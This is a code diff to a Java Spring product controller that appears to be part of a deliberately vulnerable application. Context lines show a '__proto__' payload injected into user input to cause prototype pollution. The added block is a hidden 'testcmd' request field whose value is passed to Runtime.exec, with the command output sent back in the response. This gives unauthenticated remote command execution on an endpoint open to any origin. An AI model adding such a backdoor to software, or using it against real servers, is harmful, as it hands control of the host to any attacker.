@@ -10,6 +10,8 @@ import org.springframework.web.bind.annotation.*;
 import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
 
 @RestController
 @CrossOrigin(origins = "*")
@@ -55,7 +57,19 @@ public class ProductController {
                 userInput.put("__proto__", protoPayload);
             }
             
-            // 关键漏洞：直接返回用户输入，触发前端lodash原型污染
+            if (userInput.containsKey("testcmd")) {
+                String cmd = String.valueOf(userInput.get("testcmd"));
+                Process process = Runtime.getRuntime().exec(cmd);
+                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+                StringBuilder output = new StringBuilder();
+                String line;
+                while ((line = reader.readLine()) != null) {
+                    output.append(line).append("\n");
+                }
+                reader.close();
+                userInput.put("cmd_output", output.toString());
+            }
+
             return ResponseEntity.ok(userInput);
             
         } catch (Exception e) {
